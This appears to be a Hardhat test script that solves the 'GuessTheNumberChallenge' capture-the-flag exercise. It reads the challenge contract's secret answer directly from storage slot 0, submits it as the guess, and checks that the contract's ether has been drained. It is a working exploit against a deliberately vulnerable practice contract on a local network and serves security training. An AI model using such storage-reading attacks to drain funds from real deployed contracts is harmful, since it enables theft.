import { expect } from "chai";
import { ethers } from "hardhat";

describe("GuessTheNumberChallenge", function () {

  // Reads a uint8 value from a specified storage slot
  async function readUint8FromStorageSlot(address: string, slot: number): Promise<number> {
    const storageValue = await ethers.provider.getStorageAt(address, slot);
    console.log("Raw storage value (bytes32):", storageValue);
    const parsed = Number(storageValue) & 0xff;
    console.log(`Parsed uint8 value from slot ${slot}:`, parsed);
    return parsed;
  }

  it("should solve the challenge by reading the answer from storage", async function () {
    // Get attacker address
    const [attacker] = await ethers.getSigners();
    console.log("Attacker address:", attacker.address);

    // Deploy the challenge contract with 1 ether
    const Challenge = await ethers.getContractFactory("GuessTheNumberChallenge");
    const challenge = await Challenge.connect(attacker).deploy({
      value: ethers.utils.parseEther("1.0"),
    });
    await challenge.deployed();
    console.log("Contract deployed at address:", challenge.address);

    // Read the answer from storage slot 0
    const answer = await readUint8FromStorageSlot(challenge.address, 0);
    console.log("Answer read from contract storage:", answer);

    // Submit the guess using the answer we found
    const tx = await challenge.connect(attacker).guess(answer, {
      value: ethers.utils.parseEther("1.0"),
    });
    await tx.wait();
    console.log("Guess submitted successfully");

    // Check that the challenge is solved
    const contractBalance = await ethers.provider.getBalance(challenge.address);
    console.log("Contract balance after guess:", ethers.utils.formatEther(contractBalance), "ETH");
    expect(contractBalance).to.equal(0);

    console.log("Challenge solved");
  });

});
